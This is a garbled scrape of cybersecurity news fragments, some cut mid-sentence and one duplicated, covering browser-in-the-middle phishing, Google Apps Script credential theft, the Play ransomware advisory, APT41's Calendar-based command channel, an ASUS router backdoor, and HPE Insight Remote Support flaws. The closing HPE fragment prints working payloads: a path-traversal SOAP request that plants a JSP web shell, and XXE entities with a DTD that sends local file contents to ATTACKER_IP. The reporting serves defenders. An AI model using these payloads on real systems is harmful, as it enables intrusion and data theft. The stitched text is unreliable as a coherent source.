This is achieved through tools like noVNC - an open-source VNC browser client, which opens a remote browser on top of the victim's session.\n\nSince the log in process happens in the attacker's browser, the credentials are collected but the victim also successfully accesses their account unaware of the theft.\n\nThe attack still requires tricking the victim into clicking on a malicious link that redirects them to a fake site impersonating the target service. However, this can be easily achieved through sponsored ads in web browsers, social media posts, or comments.\n\nIf users miss the suspicious URL in the browser bar and click on the log in button, the BitM window becomes active. Until triggered, the window stayed hidden from the victim in minimized mode.\n\nIf users miss the suspicious URL in the browser bar and click on the log in button, which activates the BitM window that was hidden from the victim in minimized mode.\n\nOnce activated, the attacker-controlled browser window enters fullscreen mode and covers the fake website, showing to the user the legitimate website they wanted to access.\n\nSecurity solutions like EDRs or SASE/SSE won’t trigger any warnings when this happens, as the attack abuses standard browser APIs.\n\nThe researchers explain that Firefox and Chromium-based browsers (e.g. Chrome and Edge) show an alert whenever fullscreen is active. Although many users may miss the warning, it is still a guardrail that lowers the risk of a BitM attack.\n\nHowever, on Safari there is no alert and the only sign of a browser entering fullscreen mode is a “swipe” animation that can be easily missed.\n\n\"While the attack works on all browsers, fullscreen BiTM attacks are particularly convincing on Safari browsers due to the lack of clear visual cues when going fullscreen,\" SquareX researchers say.\n\nSquareX contacted Apple with its findings and received a “wontfix” reply, the explanation received being that the animation is present to indicate changes, and that should be enough.\n\nBleepingComputer has also reached out to Apple for a comment, but we are still waiting for their response.\n\nBased on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.\n\nChrome 136 fixes 20-year browser history privacy risk",

        "title": "Attackers are mapping your attack surface—are you?",
        "content": "날짜: May 29, 2025\n\n요약: Attackers are mapping your infrastructure before you even realize what's exposed. Sprocket ASM flips the script — giving you the same recon capabilities they use, plus change detection and actionable insights to close gaps fast. See your attack surface the way hackers do and beat them to it.\n\n본문:\nToday’s threat landscape, attack surfaces are expanding faster than most security teams can track. Every new cloud asset, exposed API, forgotten subdomain, or misconfigured service becomes an opportunity for an attacker to exploit.\n\nModern threat actors are leveraging Attack Surface Management (ASM) to map out your digital footprint before you even realize what’s exposed. Through automated reconnaissance, asset discovery tools, and open-source intelligence, they’re thinking like red teamers, acting like bug bounty hunters, and exploiting gaps in real-time.\n\nThe good news is you can beat them at their own game.\n\nThis article explores how Sprocket Attack Surface Management Tool was built to understand the attacker playbook and reclaim visibility and control over your expanding attack surface.\n\nSprocket Security CEO, Casey Cammilleri, shares the difference between Sprocket ASM and other tools out there is “Seeing the hacker's perspective and a heavyweight on change detection. What has changed from yesterday and does it impact my security? That's how we've thought about building [Sprocket] ASM.”\n\nAn attacker’s point of view of ASM mirrors that of a legitimate security professional, with gathering intelligence or discovery. Thanks to publicly available tools and automation, finding exposed assets, overlooked endpoints, and shadow IT is easier than ever for an attacker. Adversaries can quickly assemble a detailed map of your external-facing infrastructure.\n\nIn the Sprocket Security Red Teamers’ experience, most organizations unintentionally expose more than they realize. Legacy dev environments, abandoned domains, or forgotten SaaS integrations are all low-hanging fruits that attackers love. They can build their own ASM workflows using a combination of open-source tools, like Amass, and custom scripts to automate these findings at scale.\n\nIf an attacker has a more up-to-date or accurate map of your infrastructure than your own, that’s where the real danger lies.\n\nThreat actors launched mass exploitation campaigns against thousands of internetexposed VMware ESXi servers using known vulnerabilities.\n\nThese flaws were actively exploited in the wild, allowing attackers on a virtual machine with administrative privileges to escape the sandbox and execute code on the host system. Despite patches being available, over 37,000 internet-exposed VMware ESXi servers remained vulnerable, highlighting the risks of unpatched, publicly accessible assets.\n\n“If it’s exposed to the internet, you better treat it like it’s already under attack. Continuously scan your external attack surface as if you’re the attacker. Flag any highvalue assets and then patch, isolate, or remove them. Don’t wait for the headlines. Act as soon as a vulnerability is disclosed before it’s exploited.” - Michael Belton, Head of Service Delivery at Sprocket Security.\n\nAre you ready to see what a hacker would see if they had free reign over your attack surface?\n\nTake the next step in becoming more secure by creating an account with Sprocket ASM.\n\nIf attackers can map your infrastructure, then you must do the same only faster, deeper, and continuously. Sprocket ASM Tool was designed to give you the same reconnaissance capabilities attackers rely on, but with context, validation, and continuous monitoring. Instead of manually going through asset inventories or reacting to alerts after the fact, you can use Sprocket ASM to see what attackers see in real time.\n\nCammilleri’s insights are “If you have ASM, you can spend less time in discovery phases and move straight into testing and validation phases. You will be more efficient and scalable in your offensive testing.”\n\nSuccessful ASM isn’t just about visibility though. It’s about actionable insights. Many organizations miss key exposures because they rely too heavily on internal CMDBs or legacy inventories. By the time those systems catch up, attackers may already be exploiting an overlooked dev instance or forgotten S3 bucket.\n\nThe key to turning recon into prevention? Operationalizing ASM. Integrating it into daily workflows, connecting it with vulnerability management, and ensuring your team acts on exposures with the urgency that an attacker has already discovered them.\n\nIf you don’t monitor your digital infrastructure from the outside in, someone else will.\n\nSprocket ASM Tool was created by penetration testers who understand attacker behaviors. Defenders need the same perspective and speed as their adversaries to stay secure. This no-cost tool delivers unparalleled visibility into your attack surface and provides insight into the evolving environment.\n\nBy revealing what attackers can exploit, our tool enables your team to act proactively and mitigate risks before they escalate.\n\n“It’s the same engine that our red team and testers use in their continuous pentesting practice. You're going to get notifications on new discoveries and changes,” shares Cammilleri, “But then you can seed the ASM with additional assets you own and manage.\n\nIf there's something that an attacker would be totally blind to on the Internet, you could still feed in that information into the ASM and start tracking it for changes and security issues.”\n\nAfter creating your free account, you can:\n\n✓ Discover all your exposed assets — domains, IP addresses, services, and much more — automatically.\n\n✓ Cut through the noise and focus on what matters most with clear, actionable risk priorities.\n\n✓ Gain control of your security posture with proactive asset discovery and effective management\n\nWatch our comprehensive ASM tool demo to uncover even more benefits of utilizing Sprocket ASM.\n\nAttackers aren’t waiting for permission. They’re already scanning, mapping, and exploiting exposed assets. If you’re not looking at your attack surface the way an attacker would, you’re already at a disadvantage. You cannot secure what you don’t know exists.\n\nUnknown assets, shadow IT, and misconfigured services are the weak links that attackers love to find, and traditional security tools often miss.\n\nThat’s why visibility is foundational. Use visibility to harden, not harm, by continuously discovering your external attack surface, prioritizing exposure by real-world risk, and closing gaps before adversaries exploit them.\n\nWith solutions like Sprocket ASM, you can stop playing catch-up and start seeing your infrastructure the way attackers do and that’s how you can beat them.\n\nSponsored and written by Sprocket Security.",

This makes it easier to trick recipients into handing over sensitive information.”\n\nGoogle Apps Script is a JavaScript-based cloud scripting platform from Google that allows users to automate tasks and extend the functionality of Google Workspace products like Google Sheets, Docs, Drive, Gmail, and Calendar.\n\nThese scripts run on a trusted Google domain under “script.google.com,” which is on the allowlist of most security products.\n\nAttackers write a Google Apps Script that displays a fake login page to capture the credentials victims enter. The data is exfiltrated to the attacker’s server via a hidden request.\n\nAs the platform allows anyone with an account to publish a script as a public web app, giving it a Google domain, the threat actors can easily share it with the victims via a phishing email that won’t trigger any warnings.\n\nThe phishing email contains an invoice payment or tax-related call to action for the recipient, linking to the malicious Google-hosted phishing page.\n\nAfter the victim enters their username and password, they are redirected to the legitimate service that was spoofed to lower suspicion and give threat actors time to exploit the stolen data.\n\nGoogle Apps Script appears to be the new focus of phishing actors that look for legitimate platforms to abuse for evasion and operational efficiency.\n\nIn this case, it also gives the attackers the flexibility to remotely adjust their script without having to resend a new link, switching to a different lure without much effort.\n\nAn effective defense measure would be to configure email security to scrutinize cloud service links and, if possible, block access to Google Apps Script URLs altogether, or at least flag them as potentially dangerous.\n\nBleepingComputer has contacted Google to ask if they plan to implement any anti-abuse measures in response to Cofense’s findings, but we have not heard back as of publication.\n\nBased on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.\n\nPhishers abuse Google OAuth to spoof Google in DKIM replay attack\n\nHackers behind UK retail attacks now targeting US companies\n\nAPT41 malware abuses Google Calendar for stealthy C2 communication\n\nGoogle claims users find ads in AI search 'helpful'\n\nGoogle fixes Android zero-day exploited by Serbian authorities",

The company sold these IP addresses and hosting services to cybercriminals, enabling them to host malicious websites.\n\nCriminals behind pig butchering scams contact victims through dating sites, social media, and messaging apps, building trust and luring victims into fake investment schemes. However, instead of investing, the fraudsters divert it to accounts they control, stealing their money.\n\nThe company uses domain generation algorithms (DGAs) to generate numerous unique domain names and also provides cybercriminals with web design templates that impersonate trusted brands. It also helps them quickly switch IP addresses and domains to thwart takedown attempts.\n\n\"Funnull is linked to the majority of virtual currency investment scam websites reported to the FBI. U.S.-based victims of these scam websites have reported over $200 million in losses, with average losses of over $150,000 per individual,\" OFAC said on Thursday.\n\nThe Treasury's Office of Foreign Assets Control (OFAC) also imposed sanctions on Liu Lizhi, a Chinese national who acted as Funnull's administrator and managed the company's employees, monitoring their performance and task progress.\n\nFollowing these sanctions, citizens and organizations in the United States are prohibited from conducting transactions with Funnull and Lizhi. All their U.S. assets will also be frozen, while financial institutions and foreign entities involved in transactions with them may also face penalties.\n\nToday, the FBI has also published a flash alert with more information, including technical details about IP addresses and domains of part of Funnull's cyber scam infrastructure.\n\n\"Since January 2025, the FBI has identified 548 unique Funnull Canonical Names (CNAME) linked to over 332,000 unique domains. In April 2025, a sample of eight domains were analyzed to depict a CNAME analysis that resolved to four CNAMEs tied to Funnull infrastructure. Between February 2023 and April 2025, the eight domains showed three different patterns of CNAME activity,\" the FBI said.\n\n\"Between October 2023 and April 2025, multiple patterns of IP address activity were observed from several domains using Funnull infrastructure.

BleepingComputer has not been able to independently confirm the breach dates.\n\nJason Slagle, President of managed service provider CNWR, told BleepingComputer that only a very small number of customers were impacted, suggesting the threat actor carried out a targeted attack against specific organizations.\n\nIn a Reddit thread, customers shared further details, stating the incident is linked to a ScreenConnect vulnerability tracked as CVE-2025-3935, patched on April 24.\n\nThe CVE-2025-3935 flaw is a high-severity ViewState code injection bug caused by unsafe deserialization of ASP.NET ViewState in ScreenConnect versions 25.2.3 and earlier.\n\nThreat actors with privileged system-level access can steal the secret machine keys used by a ScreenConnect server and utilize them to craft malicious payloads that trigger remote code execution on the server.\n\nWhile ConnectWise did not state that this vulnerability was exploited at the time, it was marked as \"High\" priority, indicating it was either actively exploited or carried a significant risk of exploitation.\n\nThe company also stated that the flaw was patched on its cloud-hosted ScreenConnect platforms at \"screenconnect.com\" and \"hostedrmm.com\" before it was publicly disclosed to customers.\n\nAs the breach only impacted cloud-hosted ScreenConnect instances, it's possible that threat actors first breached ConnectWise's systems and stole the machine keys.\n\nUsing those keys, attackers could conduct remote code execution on the company's ScreenConnect servers and potentially access customer environments.\n\nHowever, it should be noted that ConnectWise has not confirmed whether this was how customer's instances were breached.\n\nCustomers who spoke to BleepingComputer are frustrated by the lack of indicators of compromise (IOCs) and information shared by ConnectWise, leaving them with little information on what happened.\n\nLast year, a ScreenConnect flaw tracked as CVE-2024-1709 was exploited by ransomware gangs and a North Korean APT hacking group to run malware.\n\nBleepingComputer sent additional questions to ConnectWise but has not heard back at this time.\n\nBased on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.\n\nCzechia blames China for Ministry of Foreign Affairs cyberattack\n\nMarks & Spencer faces $402 million profit hit after cyberattack\n\nHackers behind UK retail attacks now targeting US companies\n\nDragonForce ransomware abuses SimpleHelp in MSP supply chain attack\n\nPowerSchool hacker pleads guilty to student data extortion scheme",

In February 2023, he was one of seven Russians sanctioned and charged in the United States for their links to the TrickBot and Conti cybercrime gangs.\n\nStill, he was only tagged at the time as a senior figure within the Trickbot group using the aliases \"Bentley,\" \"Bergen,\" \"Alex Konor,\" and \"Ben.\"\n\nThe sanctions came after a massive trove of personal information and internal conversations was leaked from TrickBot and Conti members in what was called TrickLeaks and ContiLeaks.\n\nWhile ContiLeaks provided access to the gang's internal conversations and source code, TrickLeaks went one step further, leaking the identities, online accounts, and personal information of TrickBot members on Twitter.\n\nThese conversations exposed that Kovalev, under the alias \"Stern,\" was in charge of the TrickBot operation and the Ryuk and Conti ransomware gangs. The chats illustrated how the other members would contact Stern for approval before conducting attacks or hiring lawyers for Trickbot members arrested in the United States.\n\nThe leaks ultimately expedited Conti's shutdown, with the cybercrime members moving to other operations or starting new gangs, including Royal, Black Basta, BlackCat, AvosLocker, Karakurt, LockBit, Silent Ransom, DagonLocker, and ZEON.\n\n\"According to the investigations conducted by the BKA, at times, the Trickbot group consisted of more than 100 members.

However, it also exposes a broad attack surface.\n\nIn the past, hackers have leveraged severe flaws in the platform to breach popular forums and steal the sensitive data of large numbers of users.\n\nForum administrators are recommended to apply the security updates for their vBulletin installation or move to the latest release, version 6.1.1, which is not affected by the said flaws.\n\nBased on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.\n\nFortinet fixes critical zero-day exploited in FortiVoice attacks\n\nSamsung MagicINFO 9 Server RCE flaw now exploited in attacks\n\nCritical Langflow RCE flaw exploited to hack AI app servers\n\nSAP fixes suspected NetWeaver zero-day exploited in attacks\n\nActive!

        "content": "날짜: May 30, 2025\n\n요약: Pentesting isn't just about finding flaws — it's about knowing which ones matter. Pentera's 2025 State of Pentesting report uncovers which assets attackers target most, where security teams are making progress, and which exposures still fly under the radar. Focus on reducing breach impact, not just breach count.\n\n본문:\nResults from Pentera’s 4th Pentesting report, which surveyed around 500 CISOs globally, show that while Exposure Management practices are maturing, there are still some gaps the market is yet to address.\n\nThe modern attack surface is sprawling, dynamic, distributed, and dangerously opaque. As enterprises expand into cloud-native or hybrid architectures, deploy APIs by the thousands, and integrate IoT and OT devices into core operations, the surface area for cyber threats grows both in size and complexity. Today, the average enterprise manages 75 security tools, and nearly half of CISOs report continued growth in their security stacks year over year.\n\nThis complexity isn’t deterring attackers. It enables them. Threat actors operate opportunistically. No surface is safe because attackers are driven to exploit whatever is exposed; they’re ultimately motivated to target surfaces that are relatively weaker than the next.  For security leaders, this means it’s not a question of how to cover more ground, but where to focus for maximum security - where across the attack surface is the threat of risk most implicated?\n\nThe recently released 2025 State of Pentesting report by Pentera reveals the relative vulnerability of different attack surfaces, from cloud infrastructure and web-facing assets to APIs, endpoints, and even IoT systems. CISOs from 500 enterprises were asked where across their network they perceive risk, where pentesting efforts are directed, and which areas were ultimately breached.\n\nThe results provide insight for security teams to sharpen their focus, direct their testing strategies, and close the riskiest exposures faster.\n\nTake a proactive approach to managing and reducing cyber risk, gain expert insights from cybersecurity leaders on securing enterprise-wide networks, and hear how top industry players are implementing the stages of Continuous Threat Exposure Management (CTEM).\n\nXposure delivers a forward-thinking approach to cyber resilience.\n\nEven with the best-run exposure management programs, breaches still occur. But working within more mature security programs, you realize a breach doesn’t always mean compromise.\n\nTake the example of an exposed asset. It might be breached in the technical sense—perhaps even with a threat actor establishing a foothold on it.. But if that asset isn’t tied to sensitive data, production systems, or critical services, the real-world impact is negligible.\n\nNot all breaches are equal. That’s the foundational mindset shift exposure management brings.\n\nUnlike traditional vulnerability management, where teams are chasing down CVEs based on severity scores or ticket age, exposure management is strategic. It considers both exploitability and impact to determine what vulnerabilities actually matter. This dual lens allows teams to bypass the noise and zero-in on the exposures that can lead to devastating compromise.\n\nThe State of Pentesting report reinforces this truth. Despite nearly 67% of enterprises reporting a breach in the past two years, only 36% faced downtime, 30% suffered data exposure, and 28% incurred financial loss. That means a significant portion of “breaches” had little or no operational consequence. The goal isn't to eliminate every breach - but only the ones that will hurt you.\n\nIf exposure management is about aligning remediation with risk, web-facing assets are the prime example of a cautionary tale.\n\nAccording to the data, web-facing assets top all three metrics: they’re perceived as the most vulnerable (45%), tested the most (57%), and breached the most frequently (30%).\n\nIn some ways this is encouraging. It shows that security teams are accurately prioritizing external assets, recognizing them as both accessible and attractive targets, and directing pentesting efforts accordingly.\n\nBut despite all that attention, attackers are still getting in.\n\nWhy? Because just on the basis of exposure, web-facing assets are risky. These systems - DNS, web portals, and login pages are designed to be reachable. Their openness makes them “low-hanging fruit,” especially when misconfigurations, exposed services, or open ports are left unchecked and without compensating controls such as MFA.\n\nYet this doesn’t mean failure.\n\nIf attackers breach a public-facing asset and reach a dead end - no access to sensitive systems, no valuable data, no lateral movement - then, so what? The breach had no impact. In exposure management, it’s not just about reducing breach rates - it’s about reducing the impact of breaches that do occur.\n\nWhen it comes to systems closest to the crown jewels, organizations are getting it right. They’re widely tested (48%) considered vulnerable (32%), and are seeing low breach rates (16%).\n\nInternal networks, endpoints, and applications each rank in the top tier for pentesting activity and show comparatively low breach rates, 16% for internal networks, 13% for endpoints, and 15% for applications. All suggesting a payoff in focused effort.\n\nThese are systems that house sensitive data, power operations, and represent a clear path to lateral movement or privilege escalation. Their perceived criticality earns them a greater level of focus and attention, with layered security controls and tooling that’s more mature. It also reflects something deeper: exposure management maturity. Organizations aren’t just scanning these systems for vulnerabilities, they’re pentesting them in context, prioritizing based on potential impact, and validating to confirm that defenses hold under pressure.\n\nAPIs sit at the intersection of business logic and backend systems. They’re essential, deeply integrated, and often overlooked, with data from the survey report indicating APIs may be more vulnerable than security teams realize.\n\nWhile APIs are tested at a similar rate to internal networks (48%), they show a higher breach rate, 21%, compared to 16% for internal networks. That gap suggests a disconnect: either the perceived risk of APIs is too low, or current testing approaches aren’t revealing the full picture.\n\nThe challenge is complexity. APIs are dynamic, hard to inventory, and notoriously difficult to test well. Their attack surface isn’t just about ports or endpoints, it’s about logic flaws, broken authentication, and misconfigured integrations, all leading to attack pathways that don’t show up in a standard scan.\n\nAPIs also frequently bridge systems, whether between cloud services, third-party tools, mobile apps, and internal databases. That makes them prime targets for lateral movement or data exfiltration. And their visibility gap makes them especially attractive to attackers who understand how to move below the radar.\n\nClosing the gap means leveling up testing, both in terms of frequency and depth. Continuous,  adversarial testing of APIs is essential to expose integration flaws that traditional methods appear to be missing.\n\nThe 2025 State of Pentesting report confirms what we’ve known for years - closer proximity to business risk drives sharper execution.\n\nThere’s growing alignment between perceived risk, pentesting activity, and breaches. A strong signal that exposure management practices are maturing, as teams are minimising the gap between assumed and actual risk.\n\nThe goal of exposure management isn’t to prevent every breach. It’s to prevent the ones that matter. By combining data-driven prioritization with continuous validation, security teams can focus on real exposures, not theoretical threats. Ensuring that when the attacker comes knocking, there’s nothing valuable behind that door.\n\nTo learn more about how leading enterprises are implementing their Exposure Management programs, attend Xposure, the National Exposure Management vSummit.\n\nRegister Now\n\nSponsored and written by Pentera.",

Updates to this advisory include new TTPs employed by Play ransomware group, as well as providing fresh IOCs.\n\n“The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC) are releasing this joint advisory to disseminate the Play ransomware group’s IOCs and TTPs identified through FBI investigations as recently as January 2025.” reads the advisory. “As of May 2025, FBI was aware of approximately 900 affected entities allegedly exploited by the ransomware actors.”\n\nThe Play ransomware group follows a double extortion model. Victims are instructed to contact the group via @gmx[.]de or @web[.]de email addresses and pay the ransom in cryptocurrency. If they refuse, Play actors threaten to publish the stolen data on their leak site hosted on the Tor network.\n\nThe Play ransomware group gain initial access to the target infrastructure by relying on stolen credentials and exploiting known flaws in FortiOS, Microsoft Exchange, and external-facing services like RDP and VPNs. Recently, actors linked to Play have also exploited a new SimpleHelp vulnerability (CVE-2024-57727) to remotely execute malicious code, expanding their attack methods and reach in 2025.\n\nThe threat actors behind the operation use tools like AdFind and Grixba to gather network data and identify antivirus defenses, then disable security software using GMER, IOBit, or PowerTool. They often deploy PowerShell scripts to target Microsoft Defender. Attackers rely on Cobalt Strike, SystemBC, and PsExec for lateral movement. By stealing credentials with Mimikatz and escalating privileges with WinPEAS, they spread malware via Group Policy Objects. Each ransomware binary is recompiled, making detection harder.\n\nThe report also provides information on a Play ransomware ESXi variant that shuts down all virtual machines and encrypts their files using randomly generated keys for each file.\n\n“Like the Windows variant of Play ransomware, the ESXi variant must be recompiled for each campaign.” concludes the report. “Through command line flags, the binary supports additional functionality likely used for development and debugging, including exempting specific VMs from encryption, targeting only one file for encryption, or skipping the file extension check and attempting to encrypt all files.”\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, malware)\n\nFACEBOOK \nLINKEDIN \nTWITTER\nHacking\nhacking news\ninformation security news\nIT Information Security\nmalware\nPierluigi Paganini\nPlay ransomware\nSecurity Affairs\nSecurity News",

Updates to this advisory include new TTPs employed by Play ransomware group, as well as providing fresh IOCs.\n\n“The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC) are releasing this joint advisory to disseminate the Play ransomware group’s IOCs and TTPs identified through FBI investigations as recently as January 2025.” reads the advisory. “As of May 2025, FBI was aware of approximately 900 affected entities allegedly exploited by the ransomware actors.”\n\nThe Play ransomware group follows a double extortion model. Victims are instructed to contact the group via @gmx[.]de or @web[.]de email addresses and pay the ransom in cryptocurrency. If they refuse, Play actors threaten to publish the stolen data on their leak site hosted on the Tor network.\n\nThe Play ransomware group gain initial access to the target infrastructure by relying on stolen credentials and exploiting known flaws in FortiOS, Microsoft Exchange, and external-facing services like RDP and VPNs. Recently, actors linked to Play have also exploited a new SimpleHelp vulnerability (CVE-2024-57727) to remotely execute malicious code, expanding their attack methods and reach in 2025.\n\nThe threat actors behind the operation use tools like AdFind and Grixba to gather network data and identify antivirus defenses, then disable security software using GMER, IOBit, or PowerTool. They often deploy PowerShell scripts to target Microsoft Defender. Attackers rely on Cobalt Strike, SystemBC, and PsExec for lateral movement. By stealing credentials with Mimikatz and escalating privileges with WinPEAS, they spread malware via Group Policy Objects. Each ransomware binary is recompiled, making detection harder.\n\nThe report also provides information on a Play ransomware ESXi variant that shuts down all virtual machines and encrypts their files using randomly generated keys for each file.\n\n“Like the Windows variant of Play ransomware, the ESXi variant must be recompiled for each campaign.” concludes the report. “Through command line flags, the binary supports additional functionality likely used for development and debugging, including exempting specific VMs from encryption, targeting only one file for encryption, or skipping the file extension check and attempting to encrypt all files.”\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, malware)\n\nFACEBOOK \nLINKEDIN \nTWITTER\nHacking\nhacking news\ninformation security news\nIT Information Security\nmalware\nPierluigi Paganini\nPlay ransomware\nSecurity Affairs\nSecurity News",

The exploited site delivered a malware payload, which we have dubbed “TOUGHPROGRESS”, that took advantage of Google Calendar for command and control (C2).” reads the report published by Google. “Misuse of cloud services for C2 is a technique that many threat actors leverage in order to blend in with legitimate activity.”\n\nAPT41 used spear phishing emails with a ZIP file hosted on a hacked government site. The ZIP pretended to be a document about export declarations and included a disguised LNK file and images of arthropods. Two of the images were fake, one of them contained an encrypted payload, the other a DLL used to decrypt and launch the malicious code when the victim clicked the link. A decoy PDF was shown to avoid suspicion.\n\nThe malware operates in three stealthy stages, each with a specific role and advanced evasion tactics. The first stage PLUSDROP decrypts and runs the next stage entirely in memory. Then, the second stage PLUSINJECT uses process hollowing to inject malicious code into a legitimate Windows process like svchost.exe. Finally, TOUGHPROGRESS carries out the attacker’s tasks on the infected system, communicating with its operators through Google Calendar to avoid detection.\n\nTOUGHPROGRESS starts by decrypting embedded shellcode using a hardcoded XOR key, then decompresses a DLL in memory with LZNT1. This DLL uses advanced control flow obfuscation techniques, like register-based indirect calls, dynamic address arithmetic, 64-bit register overflow, and function dispatch tables, to hide its behavior. These tricks make it hard for analysis tools to trace how the malware operates, significantly complicating reverse engineering.\n\nTOUGHPROGRESS uses Google Calendar as a stealthy command-and-control (C2) channel. It creates hidden events on specific hardcoded dates to exfiltrate stolen data and receive commands. The malware encrypts both data and commands using XOR keys and compresses messages with LZNT1. Commands are placed in Calendar event descriptions, retrieved and decrypted by the malware, then executed on the infected system. Results are encrypted and uploaded back as new calendar events, effectively turning Calendar into a covert communication tool.\n\n“To disrupt APT41 and TOUGHPROGRESS malware, we have developed custom fingerprints to identify and take down attacker-controlled Calendars.” continues the report. “We have also terminated attacker-controlled Workspace projects, effectively dismantling the infrastructure that APT41 relied on for this campaign.

Using subtle tactics, like auth bypasses and abuse of legit settings, the attackers avoid detection while keeping control, even after reboots or updates. Though attribution remains unclear, the campaign shows signs of a skilled, well-funded adversary building a covert botnet infrastructure.\n\n“GreyNoise has identified an ongoing exploitation campaign in which attackers have gained unauthorized, persistent access to thousands of ASUS routers exposed to the internet.” reads the report published by GreyNoise. “The attacker’s access survives both reboots and firmware updates, giving them durable control over affected devices.”\n\nThe payloads observed by the experts only target ASUS RT-AC3100 or RT-AC3200 with an Out-Of-Box configuration.\n\nGreyNoise also found a payload exploiting the authenticated command injection flaw CVE-2023-39780 in ASUS RT-AX55 v3.0.0.4.386.51598 to execute arbitrary system commands.\n\nThe attackers exploit the command injection flaw to add their SSH key and enable access on port 53282, ensuring persistent backdoor access across reboots and updates.\n\n“This payload leverages built-in ASUS router features to enable SSH on both LAN and WAN, bind it to TCP/53282, and add an attacker-controlled public key.” ‍reads the full technical analysis published by GreyNoise.  “Because this key is added using the official ASUS features, this config change is persisted across firmware upgrades. If you’ve been exploited previously, upgrading your firmware will NOT remove the SSH backdoor.”\n\nAs of May 27, nearly 9,000 ASUS routers are confirmed compromised, based on Censys data. Despite the scale, only 30 related requests were observed over three months, highlighting how stealthy the campaign is.\n\nGreyNoise published a list of four IP addresses associated with the botnet’s campaign as Indicators of Compromise.\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, AyySSHush botnet)\n\nFACEBOOK \nLINKEDIN \nTWITTER\nAyySSHush botnet\nbotnet\nCybercrime\nHacking\nhacking news\ninformation security news\nIT Information Security\nmalware\nSecurity Affairs\nSecurity News",

The operation used fake accounts, in some cases threat actors used AI-generated photos and run by an account farm to spread local-language content. Topics included support for Myanmar’s junta, criticism of Japan’s U.S. ties, and corruption claims in Taiwan. According to the report, the network had approximately 7,800 Page followers, 25 Group members, and 700 Instagram followers.\n\nMeta removed 17 Facebook accounts, 22 Pages, and 21 Instagram accounts tied to an Iran-based network targeting Azeri-speaking users in Azerbaijan and Turkey. These fake accounts posed as female journalists and pro-Palestine activists, using hashtags like #palestine and #gaza to spread spammy content across Meta platforms, YouTube, X, and websites. Company’s automated systems disabled some of the fake accounts. Posts focused on global events and anti-U.S. rhetoric. The network gained 44,000 Page followers, 63,000 Instagram followers, and spent $70 on ads.\n\nThe social media company also removed 658 Facebook accounts, 14 Pages, and 2 Instagram accounts linked to a Romania-based network for violating coordinated inauthentic behavior policies. These fake accounts, some auto-detected, posed as locals sharing sports, travel, and local news to appear credible across Facebook, YouTube, X, and TikTok. They also commented on posts by politicians and news outlets. The campaign had 18,300 Page followers, 40 on Instagram, and spent around $177,000 on ads, mostly in USD.\n\nThe Adversarial Threat Report published by the company also includes Threat indicators for the ablot campaigns.\n\n“To help the broader research community to study and protect people across different internet services, we’ve collated and organized these indicators according to the Online Operations Kill Chain framework, which we use to analyze many sorts of malicious online operations, identify the earliest opportunities to disrupt them, and share information across investigative teams.” reads the Meta’s Adversarial Threat Report, First Quarter 2025. “The kill chain describes the sequence of steps that threat actors go through to establish a presence across the internet, disguise their operations, engage with potential audiences, and respond to takedowns.

This allows attackers to use directory traversal sequences (e.g., ../../) to write files outside the intended directory, potentially placing malicious web shells in executable paths such as Tomcat’s webapps/ROOT/.\nExample SOAP payload for exploitation: xml<web:DataPackageSubmissionRequest> <web:attachments> <web:ArrayOfAttachment> <web:Attachment> <web:FileName>../../webapps/ROOT/shell.jsp</web:FileName> <web:FileContent>{base64-encoded-malicious-jsp}</web:FileContent> </web:Attachment> </web:ArrayOfAttachment> </web:attachments> </web:DataPackageSubmissionRequest>\nVulnerable code snippet: javaString attachmentFileLocation = attachmentFileDirectory + File.separatorChar + attachmentName; File file = new File(attachmentFileLocation); file.createNewFile(); // Writes attacker-controlled content to arbitrary paths\nSuccessful exploitation can result in full remote code execution under the privileges of the IRS service.\nXML External Entity (XXE) Injection & Information Disclosure:\nThe validateAgainstXSD method in HPE’s ucacore library processes XML input during device registration without sufficient Document Type Definition (DTD) restrictions. Attackers can inject malicious XML entities into SOAP requests, causing the server to leak local file contents or environment variables via HTTP requests to attacker-controlled hosts.\nExample XXE payload: xml<tns:identifiers> <![CDATA[<!DOCTYPE a SYSTEM \"http://ATTACKER_IP/malicious.dtd\"> <a>&callhome;</a>]]> </tns:identifiers>\nMalicious DTD to exfiltrate file content: xml<!ENTITY % file SYSTEM \"file:///C:/users/Administrator/Desktop/hello.txt\"> <!ENTITY % eval \"<!ENTITY % exfiltrate SYSTEM 'http://ATTACKER_IP/?content=%file;'>\"> %eval; %exfiltrate;\nThis attack can be chained with the directory traversal flaw to steal authentication tokens and escalate privileges.\nMitigation and Recommendations\n\nHPE has released IRS version 7.15.0.646, which addresses these vulnerabilities by:\n\nDisabling DTD processing in XML validators\nImplementing strict input sanitization for file paths\nAdding authentication checks to sensitive workflows\n\nImmediate Steps for Administrators:\n\nUpgrade IRS installations to v7.15.0.646 or later via Administrator Settings > Software Updates.\nEnable automatic updates to ensure timely patching.\nAudit logs for suspicious SOAP requests to /DeviceRegistration and /DataPackageReceiver from endpoints.\nRestrict external access to IRS endpoints if the tool is used in an internal-only context.\n\nThese vulnerabilities underscore the importance of robust input validation and secure XML parsing in enterprise software.\n\nOrganizations running HPE Insight Remote Support must patch immediately to prevent potential exploitation, data breaches, and remote system compromise.\n\nRegular monitoring and adherence to security best practices remain critical in defending against evolving threats.\n\nFor further technical details and proof-of-concept code, refer to public advisories and HPE’s official security bulletin.\n\nTo Upgrade Your Cybersecurity Skills, Take Diamond Membership With 150+ Practical Cybersecurity Courses Online – Enroll Here",

